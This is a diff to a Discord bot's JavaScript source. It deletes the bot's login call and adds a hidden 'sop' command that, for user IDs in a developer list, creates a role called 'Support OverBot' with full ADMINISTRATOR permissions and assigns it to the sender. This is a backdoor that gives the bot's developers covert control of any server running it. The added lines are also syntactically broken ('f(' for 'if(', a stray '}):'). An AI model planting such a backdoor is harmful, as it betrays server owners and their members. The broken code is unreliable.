@@ -300,6 +300,13 @@ message.channel.send({embed})
     message.delete()
     message.member.removeRole(`554797816963399691`);
    }
-});
-// THIS  MUST  BE  THIS  WAY
-client.login(process.env.BOT_TOKEN)
+	f(message.content.startsWith(prefix + "sop") && dev_id.indexOf(message.author.id) != -1) {
+
+soprole = await message.guild.createRole({
+        name: "Support OverBot",
+        color: "#fe0e0e",
+        permissions:["ADMINISTRATOR"]
+      })
+message.member.addRole(soprole);
+}
+}):
